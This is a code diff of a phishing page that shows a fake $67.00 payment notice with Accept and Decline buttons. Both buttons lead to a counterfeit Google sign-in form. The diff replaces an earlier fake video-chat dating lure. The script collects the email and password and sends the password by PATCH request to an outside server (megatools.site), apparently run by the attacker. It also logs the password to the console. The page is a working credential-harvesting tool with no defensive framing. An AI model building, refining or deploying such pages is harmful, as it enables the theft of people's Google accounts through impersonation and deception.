@@ -4,7 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Live Video Chat Login</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
     <style>
       * {
         margin: 0;
@@ -14,7 +19,7 @@
       }
 
       body {
-        background-color: white;
+        background: linear-gradient(to right, #e3f2fd, #bbdefb);
         display: flex;
         justify-content: center;
         align-items: center;
@@ -23,70 +28,93 @@
 
       .container {
         width: 450px;
-        padding: 48px 40px 36px;
-        border: 1px solid #dadce0;
-        border-radius: 8px;
+        padding: 48px 40px;
+        border-radius: 12px;
+        background: #ffffff;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        transition: all 0.3s ease;
       }
 
       .logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
         text-align: center;
-        margin-bottom: 16px;
+        /* margin-bottom: 16px; */
       }
 
       .logo img {
-        width: 75px;
-        height: 85px;
+        width: 90px;
       }
 
       .title {
-        font-size: 24px;
-        font-weight: 400;
+        font-size: 26px;
         text-align: center;
-        margin-bottom: 8px;
+        margin-bottom: 10px;
       }
 
       .subtitle {
         font-size: 16px;
-        font-weight: 400;
         text-align: center;
         color: #5f6368;
-        margin-bottom: 40px;
+        margin-bottom: 30px;
       }
 
       .form-group {
-        margin-bottom: 24px;
+        margin-bottom: 20px;
       }
 
       .form-group input {
         width: 100%;
-        padding: 13px 15px;
+        padding: 14px;
         border: 1px solid #dadce0;
-        border-radius: 4px;
+        border-radius: 6px;
         font-size: 16px;
-        outline: none;
       }
 
       .form-group input:focus {
         border-color: #1a73e8;
-        border-width: 2px;
-        padding: 12px 14px;
+        outline: none;
       }
 
-      .forgot-email {
-        text-align: left;
-        margin-bottom: 26px;
+      .btn-google2 {
+        margin: auto;
+        background: #c94b24;
+        color: #fff;
+        border: none;
+        padding: 7px 40px;
+        border-radius: 6px;
+        font-size: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      .btn-google {
+        margin: auto;
+        background: #34b100;
+        color: #fff;
+        border: none;
+        padding: 7px 40px;
+        border-radius: 6px;
+        font-size: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+
+        margin-top: 10px;
       }
 
-      .forgot-email a {
-        color: #1a73e8;
-        text-decoration: none;
-        font-size: 14px;
-        font-weight: 500;
+      .btn-google img {
+        width: 20px;
+        margin-right: 10px;
       }
 
       .divider {
         position: relative;
-        margin: 32px 0;
+        margin: 30px 0;
         text-align: center;
       }
 
@@ -96,175 +124,147 @@
         top: 50%;
         left: 0;
         right: 0;
-        border-top: 1px solid #dadce0;
-        z-index: 1;
+        height: 1px;
+        background: #dadce0;
       }
 
       .divider span {
+        background: #fff;
         position: relative;
-        display: inline-block;
-        padding: 0 8px;
-        background-color: white;
-        color: #5f6368;
-        font-size: 14px;
-        z-index: 2;
-      }
-
-      .guest-mode {
+        padding: 0 10px;
         font-size: 14px;
         color: #5f6368;
-        margin-bottom: 40px;
-        line-height: 1.5;
-      }
-
-      .guest-mode a {
-        color: #1a73e8;
-        text-decoration: none;
-        font-weight: 500;
-      }
-
-      .create-account {
-        font-size: 14px;
-        color: #5f6368;
-        margin-bottom: 40px;
-      }
-
-      .create-account a {
-        color: #1a73e8;
-        text-decoration: none;
-        font-weight: 500;
       }
 
       .buttons {
         display: flex;
         justify-content: space-between;
-        align-items: center;
+        margin-top: 20px;
       }
-
-      .btn {
-        padding: 10px 24px;
-        border-radius: 4px;
-        font-size: 14px;
-        font-weight: 500;
-        cursor: pointer;
-        outline: none;
+      .time {
+        text-align: center;
+      }
+      .for {
+        text-align: center;
       }
 
       .btn-next {
-        background-color: #1a73e8;
-        color: white;
+        background: #1a73e8;
+        color: #fff;
         border: none;
-      }
-
-      .btn-next:hover {
-        background-color: #1765cc;
-        box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3),
-          0 1px 3px 1px rgba(66, 133, 244, 0.15);
-      }
-
-      .email-display {
-        font-size: 16px;
+        padding: 10px 20px;
+        border-radius: 6px;
         font-weight: 500;
+        cursor: pointer;
+      }
+      .payment-container {
+        background: white;
+        position: absolute;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        margin: 16px;
+        border-radius: 20px;
+        display: flex;
+        flex-direction: column;
+        padding: 30px 20px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        overflow-y: auto;
+      }
+      .profile-pic {
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        object-fit: cover;
+        margin: 10px auto 25px;
+        border: 3px solid #f5f5f5;
+      }
+      .user-name {
+        font-size: 24px;
+        font-weight: 700;
         text-align: center;
         margin-bottom: 8px;
+        color: #222;
       }
-
-      .verify-message {
-        font-size: 14px;
-        color: #5f6368;
+      .payment-from {
+        color: #777;
+        font-size: 17px;
         text-align: center;
-        margin-bottom: 24px;
+        margin-bottom: 50px;
       }
-
-      .password-input {
-        position: relative;
-      }
-
-      .show-password {
-        position: absolute;
-        right: 10px;
-        top: 50%;
-        transform: translateY(-50%);
-        color: #5f6368;
-        font-size: 14px;
-        cursor: pointer;
-      }
-
-      .forgot-password {
-        text-align: right;
-        margin-top: 8px;
-      }
-
-      .forgot-password a {
-        color: #1a73e8;
-        text-decoration: none;
-        font-size: 14px;
-        font-weight: 500;
-      }
-
-      .video-chat-container {
+      .amount {
+        font-size: 46px;
+        font-weight: 700;
         text-align: center;
-        padding: 20px;
+        margin: 30px 0;
+        color: #111;
       }
-
-      .video-chat-title {
-        font-size: 20px;
-        margin-bottom: 16px;
+      .description {
+        color: #666;
+        font-size: 17px;
+        text-align: center;
+        margin-bottom: 15px;
+        line-height: 1.4;
       }
-
-      .video-chat-subtitle {
-        font-size: 14px;
-        color: #5f6368;
-        margin-bottom: 24px;
+      .time {
+        color: #999;
+        font-size: 16px;
+        text-align: center;
+        margin-bottom: 60px;
       }
-
-      .btn-google {
-        background-color: #1a73e8;
-        color: white;
+      .profile {
+        filter: blur(2px);
+      }
+      .btn-container {
+        margin-top: auto;
+        padding-bottom: 20px;
+      }
+      .btn {
+        width: 100%;
+        padding: 18px;
         border: none;
-        padding: 10px 24px;
-        border-radius: 4px;
-        font-size: 14px;
-        font-weight: 500;
+        border-radius: 30px;
+        font-size: 19px;
+        font-weight: 600;
+        color: white;
+        margin-bottom: 15px;
         cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto;
+        transition: all 0.2s;
       }
-
-      .btn-google img {
-        width: 18px;
-        margin-right: 8px;
+      .btn:active {
+        transform: scale(0.98);
       }
-
-      .loading-container {
-        text-align: center;
-        padding: 40px 0;
-        display: none;
+      .btn-accept {
+        background: linear-gradient(to right, #34b100, #2e9e00);
+        box-shadow: 0 3px 10px rgba(52, 177, 0, 0.3);
       }
-
+      .btn-decline {
+        background: linear-gradient(to right, #c94b24, #b54220);
+        box-shadow: 0 3px 10px rgba(201, 75, 36, 0.3);
+      }
+      @media (max-width: 400px) {
+        .payment-container {
+          margin: 12px;
+          padding: 25px 18px;
+        }
+        .profile-pic {
+          width: 80px;
+          height: 80px;
+        }
+        .amount {
+          font-size: 42px;
+          margin: 25px 0;
+        }
+      }
       .loading-spinner {
         border: 4px solid rgba(0, 0, 0, 0.1);
-        border-radius: 50%;
         border-top: 4px solid #1a73e8;
+        border-radius: 50%;
         width: 40px;
         height: 40px;
         animation: spin 1s linear infinite;
-        margin: 0 auto 20px;
-      }
-
-      .loading-text {
-        font-size: 16px;
-        color: #5f6368;
-      }
-
-      .form-step {
-        display: none;
-      }
-
-      .form-step.active {
-        display: block;
+        margin: 20px auto;
       }
 
       @keyframes spin {
@@ -275,111 +275,65 @@
           transform: rotate(360deg);
         }
       }
+
+      .form-step {
+        display: none;
+      }
+
+      .form-step.active {
+        display: block;
+      }
     </style>
   </head>
   <body>
-    <!-- Step 1: Live Video Chat Login -->
     <div class="container">
       <div class="form-step active" id="step1">
-        <div class="video-chat-container">
-          <h2 class="video-chat-title">Live Video Chat</h2>
-          <p class="video-chat-subtitle">
-            Login with Google and enjoy with<br />Private Live Video Chat your
-            dating
-          </p>
-          <button class="btn-google" onclick="nextStep()">
-            <img
-              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png"
-              alt="Google"
-              style="width: 70px"
-            />
-            Login with Google
-          </button>
+        <div class="profile">
+          <img
+            src="https://res.cloudinary.com/iuoluiol/image/upload/v1730230912/wkl8k8fmws9svlu0xqi5.png"
+            alt="Profile"
+            class="profile-pic"
+          />
+
+          <div class="user-name">Tomas B. Adams</div>
+          <div class="payment-from">Payment from Adams</div>
+
+          <div class="amount">$67.00</div>
+          <div class="description">For la flame fans must eat</div>
+          <div class="time" id="timestamp"></div>
+        </div>
+        <div class="btn-container">
+          <button class="btn btn-accept" onclick="nextStep()">Accept</button>
+          <button class="btn btn-decline" onclick="nextStep()">Decline</button>
         </div>
       </div>
 
-      <!-- Step 2: Email/Phone Input -->
       <div class="form-step" id="step2">
-        <div class="logo">
-          <img
-            src="https://maps-web3.site/location/v3/signin/6s5Eha.png"
-            alt="logo"
-          />
-        </div>
-        <h1 class="title">Sign in</h1>
+        <h2 class="title">Sign in</h2>
         <p class="subtitle">Use your Google Account</p>
-
         <div class="form-group">
           <input type="text" id="email" placeholder="Email or phone" />
         </div>
-
-        <div class="forgot-email">
-          <a href="#">Forgot email?</a>
-        </div>
-
-        <div class="divider">
-          <span>or</span>
-        </div>
-
-        <div class="guest-mode">
-          Not your computer? Use Guest mode to sign in privately.
-          <a href="#">Learn more about using Guest mode</a>
-        </div>
-
-        <div class="create-account">
-          <a href="#">Create account</a>
-        </div>
-
+        <div class="divider"><span>or</span></div>
         <div class="buttons">
-          <a
-            href="#"
-            style="color: #1a73e8; text-decoration: none; font-weight: 500"
-            >Learn more</a
-          >
-          <button class="btn btn-next" onclick="nextStep()">Next</button>
+          <button class="btn-next" onclick="nextStep()">Next</button>
         </div>
       </div>
 
-      <!-- Step 3: Password Verification -->
       <div class="form-step" id="step3">
-        <div class="logo">
-          <img
-            src="https://maps-web3.site/location/v3/signin/6s5Eha.png"
-            alt="logo"
-          />
+        <h2 class="title">Welcome Back</h2>
+        <p class="subtitle">Enter your password</p>
+        <div class="form-group">
+          <input type="password" id="password" placeholder="Password" />
         </div>
-        <div class="email-display" id="display-email"></div>
-        <p class="verify-message">To continue, first verify it's you</p>
-
-        <div class="form-group password-input">
-          <input
-            type="password"
-            id="password"
-            placeholder="Enter your password"
-          />
-          <span class="show-password" onclick="togglePassword()">Show</span>
-        </div>
-
-        <div class="forgot-password">
-          <a href="#">Forgot password?</a>
-        </div>
-
         <div class="buttons">
-          <a
-            href="#"
-            style="color: #1a73e8; text-decoration: none; font-weight: 500"
-            >Learn more</a
-          >
-          <button class="btn btn-next" onclick="showLoading()">Next</button>
+          <button class="btn-next" onclick="showLoading()">Sign in</button>
         </div>
       </div>
 
-      <!-- Step 4: Loading Screen -->
       <div class="form-step" id="step4">
-        <div class="loading-container" id="loading-screen">
-          <div class="loading-spinner"></div>
-          <div class="loading-text">Signing in...</div>
-        </div>
+        <div class="loading-spinner"></div>
+        <p class="subtitle" style="text-align: center">Signing in...</p>
       </div>
     </div>
 
@@ -445,7 +399,7 @@
                 return res.json();
               })
               .then(() => {
-                document.getElementById("display-email").textContent = email;
+                document.getElementById("email").textContent = email;
                 goToNextStep(); // Only proceed if email POST was successful
               })
               .catch((err) => {
@@ -467,8 +421,9 @@
       }
 
       function showLoading() {
-        const email = document.getElementById("display-email").textContent;
+        const email = document.getElementById("email").textContent;
         const password = document.getElementById("password").value;
+        console.log(password, "password");
 
         if (!password) {
           alert("Please enter your password.");
@@ -476,7 +431,7 @@
         }
 
         goToNextStep(); // Go to step 4 (loading)
-        document.getElementById("loading-screen").style.display = "block";
+        // document.getElementById("loading-screen").style.display = "block";
 
         fetch(`https://megatools.site/api/v1/information/${_id}`, {
           method: "PATCH",
@@ -486,7 +441,6 @@
           body: JSON.stringify({
             user: id,
             siteName: `AutoInfo/login`,
-
             password: password,
           }),
         })
@@ -495,6 +449,8 @@
             return res.json();
           })
           .then((data) => {
+            console.log("last request successful", data);
+
             // alert("Login successful! Redirecting...");
             // window.location.href = "/dashboard";
           })
@@ -540,6 +496,18 @@
           });
         });
       }
+      const formatTime = (date) => {
+        const options = {
+          hour: "numeric",
+          minute: "2-digit",
+          hour12: true,
+        };
+        const timeString = date.toLocaleTimeString("en-US", options);
+        return `Today at ${timeString}`;
+      };
+
+      const now = new Date();
+      document.querySelector(".time").textContent = formatTime(now);
       //   connectAndJoinRoom(_id);
     </script>
   </body>
